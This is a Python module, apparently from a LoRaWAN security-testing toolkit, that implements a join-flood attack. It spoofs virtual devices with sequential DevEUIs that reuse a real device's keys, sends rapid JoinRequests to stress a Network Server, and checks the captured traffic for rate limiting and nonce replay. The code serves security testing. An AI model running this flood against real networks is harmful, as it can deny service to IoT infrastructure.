"""Join procedure abuse attacks - refactored to new API."""

from __future__ import annotations

import secrets
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING, Any

from lora_attack_toolkit.attacks.base import BaseAttack
from lora_attack_toolkit.attacks.result import AttackResult
from lora_attack_toolkit.attacks.analyzer import AttackAnalyzer
from lora_attack_toolkit.attacks.packet_capture import PacketCapture
from lora_attack_toolkit.attacks.validation import validate_criteria
from lora_attack_toolkit.lorawan.protocol.frames import build_join_request

if TYPE_CHECKING:
    from lora_attack_toolkit.attacks.context import AttackContext
    from lora_attack_toolkit.core.schema_v1 import ExpectedBehavior, JoinFloodConfigV1


@dataclass
class VirtualDevice:
    """Virtual device for join flood attack."""
    
    dev_eui: bytes
    join_eui: bytes
    app_key: bytes
    dev_nonce: bytes = b""
    
    @property
    def dev_eui_hex(self) -> str:
        return self.dev_eui.hex()

    @property
    def app_eui(self) -> bytes:
        return self.join_eui
    
    def build_join_request(self) -> bytes:
        """Build JoinRequest for this virtual device."""
        self.dev_nonce = secrets.token_bytes(2)
        return build_join_request(
            join_eui=self.join_eui,
            dev_eui=self.dev_eui,
            dev_nonce=self.dev_nonce,
            app_key=self.app_key,
        )


class JoinAbuseAnalyzer(AttackAnalyzer):
    """Analyzer for join procedure abuse attack results."""
    
    def analyze(
        self, capture: PacketCapture, expected: ExpectedBehavior | None = None
    ) -> dict[str, Any]:
        """Analyze join abuse attack results."""
        stats = capture.get_stats()
        
        # Count join requests
        join_requests = [p for p in capture.uplinks if p.packet_type == "join_request"]
        join_accepts = [p for p in capture.downlinks if p.packet_type == "join_accept"]
        
        if not join_requests:
            return {
                "success": False,
                "message": "No join requests captured",
                "metrics": {"uplinks_captured": stats["total_uplinks"]},
            }
        
        elapsed_time = 0.0
        dev_nonces: list[str] = []
        for packet in join_requests:
            if "elapsed_time" in packet.metadata:
                elapsed_time = packet.metadata["elapsed_time"]
            if "dev_nonce" in packet.metadata:
                dev_nonces.append(str(packet.metadata["dev_nonce"]))
        
        rate = len(join_requests) / elapsed_time if elapsed_time > 0 else 0
        unique_dev_nonces = len(set(dev_nonces))
        replayed_dev_nonces = max(0, len(dev_nonces) - unique_dev_nonces)
        accept_ratio = (len(join_accepts) / len(join_requests)) if join_requests else 0.0
        
        metrics = {
            "attack_type": "join_flood",
            "join_requests_sent": len(join_requests),
            "join_accepts_received": len(join_accepts),
            "flood_duration_sec": elapsed_time,
            "request_rate_per_sec": round(rate, 2),
            "total_uplinks": stats["total_uplinks"],
            "total_downlinks": stats["total_downlinks"],
            "unique_dev_nonces": unique_dev_nonces,
            "replayed_dev_nonces": replayed_dev_nonces,
            "join_accept_ratio": round(accept_ratio, 2),
        }
        
        message = f"Join flood executed: {len(join_requests)} requests sent"
        if elapsed_time > 0:
            message += f" at {rate:.2f} req/s"
        if join_accepts:
            message += "; possible rate limiting detected"
        
        result = {
            "success": True,
            "message": message,
            "metrics": metrics,
        }
        
        if expected:
            validation = validate_criteria(
                attack_type="join_flood",
                criteria=expected.security_criteria,
                metrics=metrics,
                capture_stats=stats,
                secure_behavior=expected.secure_behavior,
            )
            result.update(validation.to_dict())
            result["validation_summary"] = validation.get_summary()
        
        return result


class JoinAbuseAttack(BaseAttack):
    """
    Join procedure abuse attack using new simplified API.
    
    Sends multiple JoinRequests rapidly to stress the Network Server.
    """
    
    name = "join_flood"

    def run(self, ctx: AttackContext) -> AttackResult:
        """
        Execute join abuse attack.
        
        Args:
            ctx: Attack context with all services and typed configuration
        
        Returns:
            AttackResult with execution outcome
        """
        ctx.logger.info(f"Starting {self.name} attack")
        
        try:
            # Get typed configuration
            config: JoinFloodConfigV1 = ctx.config
            
            # Start gateway
            ctx.logger.info("Starting gateway...")
            ctx.gateway.start()
            time.sleep(0.5)
            
            self._execute_join_flood(ctx, config)
            
            # Stop gateway
            ctx.gateway.stop()
            
            # Analyze results
            ctx.logger.info("Analyzing results...")
            analyzer = JoinAbuseAnalyzer()
            analysis = analyzer.analyze(ctx.capture, ctx.expected)
            
            return AttackResult(
                attack_name=self.name,
                attack_type="join_flood",
                success=analysis["success"],
                message=analysis["message"],
                metrics=analysis["metrics"],
                captured_packets=len(ctx.capture.uplinks) + len(ctx.capture.downlinks),
                validation_summary=analysis.get("validation_summary"),
                criteria_met=analysis.get("criteria_met"),
            )
            
        except Exception as e:
            ctx.logger.error(f"Attack failed: {e}", exc_info=True)
            return AttackResult(
                attack_name=self.name,
                attack_type="join_flood",
                success=False,
                message=f"Attack execution failed: {str(e)}",
                metrics={},
                error=str(e),
            )
    
    def _execute_join_flood(self, ctx: AttackContext, config: JoinFloodConfigV1) -> None:
        """Execute join flood attack - send multiple JoinRequests."""
        ctx.logger.info(
            f"Executing join flood attack: {config.flood_count} requests",
            extra={"flood_count": config.flood_count},
        )
        
        # Generate virtual devices
        virtual_devices = self._generate_virtual_devices(ctx, config.virtual_devices)
        
        start_time = time.time()
        
        for i in range(config.flood_count):
            # Select virtual device (round-robin if multiple)
            device_idx = i % len(virtual_devices)
            virtual_device = virtual_devices[device_idx]
            
            # Build JoinRequest from virtual device
            join_request = virtual_device.build_join_request()
            dev_nonce = virtual_device.dev_nonce
            
            ctx.logger.info(
                f"Sending flood JoinRequest {i + 1}/{config.flood_count} "
                f"from device {virtual_device.dev_eui_hex} with DevNonce={dev_nonce.hex()}",
                extra={
                    "flood_number": i + 1,
                    "total": config.flood_count,
                    "dev_eui": virtual_device.dev_eui_hex,
                    "dev_nonce": dev_nonce.hex(),
                },
            )
            
            # Forward JoinRequest
            ctx.gateway.forward_uplink(join_request, ctx.radio)
            
            # Capture for analysis
            elapsed = time.time() - start_time
            ctx.capture.capture_uplink(
                phy_payload=join_request,
                packet_type="join_request",
                metadata={
                    "phase": "execute",
                    "flood_number": i + 1,
                    "dev_eui": virtual_device.dev_eui_hex,
                    "dev_nonce": dev_nonce.hex(),
                    "elapsed_time": elapsed,
                },
            )
            
            # Delay between requests
            if i < config.flood_count - 1:
                time.sleep(config.flood_interval_sec)
        
        elapsed_time = time.time() - start_time
        ctx.logger.info(
            f"Join flood attack executed: {config.flood_count} requests sent in {elapsed_time:.2f}s"
        )

    def _generate_virtual_devices(self, ctx: AttackContext, count: int) -> list[VirtualDevice]:
        """Generate virtual devices for flood attack."""
        device = ctx.device
        join_eui = getattr(device, "_join_eui", None)
        app_key = getattr(device, "_app_key", None)
        dev_eui_bytes = getattr(device, "_dev_eui", None)
        if join_eui is None or app_key is None or dev_eui_bytes is None:
            raise RuntimeError("Device does not expose join device identifiers")

        devices = []
        start_value = int.from_bytes(dev_eui_bytes, byteorder="big")
        
        for i in range(count):
            dev_eui = (start_value + i).to_bytes(8, byteorder="big")
            dev_nonce = secrets.token_bytes(2)
            
            devices.append(
                VirtualDevice(
                    dev_eui=dev_eui,
                    join_eui=join_eui,
                    app_key=app_key,
                    dev_nonce=dev_nonce,
                )
            )
        
        ctx.logger.debug(f"Generated {count} virtual devices for flood attack")
        return devices
